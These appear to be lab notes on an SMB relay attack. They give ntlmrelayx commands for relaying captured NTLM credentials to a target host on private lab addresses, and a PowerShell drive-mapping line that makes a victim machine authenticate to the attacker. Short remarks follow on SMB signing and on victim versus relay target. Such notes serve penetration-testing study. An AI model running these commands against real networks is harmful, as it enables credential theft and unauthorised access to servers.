SMB Relay Attack

Option A: Target single host
ntlmrelayx.py -t smb://192.168.182.10 -smb2support --no-dump --no-acl --no-validate-privs --remove-mic -debug

Option B: Target from file
sudo python3 -m impacket.ntlmrelayx -tf targets.txt -smb2support

•	targets.txt contains: 192.168.182.10
On Windows victim:
•	Trigger the relay manually via PowerShell:
# One-time drive mapping (non-persistent)
New-PSDrive -Name X -PSProvider FileSystem -Root "\\192.168.182.136\IPC$" -Persist:$false -ErrorAction SilentlyContinue

Observation:
•	NTLM credentials captured by attacker and relayed to the target.
•	Note: Modern Windows systems with SMB signing enabled may block relay attacks; only capture-only attacks may succeed.
 Important Notes 
Do NOT run Responder and ntlmrelayx on the same interface simultaneously → port conflicts (SMB ports 445/139).
1.	Victim vs Relay Target:
o	Victim: machine tricked into authenticating → provides credentials.
o	Relay Target: high-value machine attacker wants to access (server, DC).
o	Usually, victim ≠ relay target.
